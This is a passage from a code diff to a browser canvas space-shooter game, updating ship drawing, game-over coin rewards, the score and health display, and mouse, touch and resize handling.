+            if(b.y > cvs.height + 60) game.eBullets.splice(i, 1);
+        }
+
+        // Player Ship
+        if(s.c === 'special') {
+            ctx.save();
+            ctx.filter = "invert(1) brightness(1.8)"; 
+            ctx.drawImage(specialImg, game.px-38, game.py-38, 76, 76);
+            ctx.restore();
+        } else {
+            ctx.fillStyle = s.c; ctx.shadowBlur = 15; ctx.shadowColor = s.c;
+            ctx.beginPath(); 
+            ctx.moveTo(game.px, game.py-30); ctx.lineTo(game.px-25, game.py+20); ctx.lineTo(game.px+25, game.py+20); 
+            ctx.fill(); ctx.shadowBlur = 0;
+        }
+        
+        if(game.hp <= 0) { 
+            game.running = false; 
+            let bounty = Math.floor(game.skor / 8);
+            user.coins += bounty; saveDB();
+            document.getElementById('final-skor').innerText = Math.floor(game.skor);
+            document.getElementById('earned-coins').innerText = bounty;
+            nav('scr-over'); 
+        }
+
+        document.getElementById('skor-val').innerText = Math.floor(game.skor);
+        document.getElementById('hp-val').style.width = Math.max(0, game.hp) + "%";
+        document.getElementById('sh-val').style.width = Math.max(0, game.sh) + "%";
     }
     requestAnimationFrame(loop);
 }
 
-window.addEventListener('mousemove', e => game.tx = e.clientX);
-window.addEventListener('touchmove', e => { game.tx = e.touches[0].clientX; e.preventDefault(); }, {passive:false});
-cvs.width = window.innerWidth; cvs.height = window.innerHeight; loop();
+const moveShip = (x) => { game.tx = Math.max(35, Math.min(cvs.width-35, x)); };
+window.addEventListener('mousemove', e => moveShip(e.clientX));
+window.addEventListener('touchmove', e => { 
+    if(game.running) { moveShip(e.touches[0].clientX); e.preventDefault(); } 
+}, {passive:false});
+
+window.addEventListener('resize', () => {
+    cvs.width = window.innerWidth; cvs.height = window.innerHeight;
+});
+
+cvs.width = window.innerWidth; cvs.height = window.innerHeight; 
+requestAnimationFrame(loop);
 </script>
 </body>
 </html>
+
+
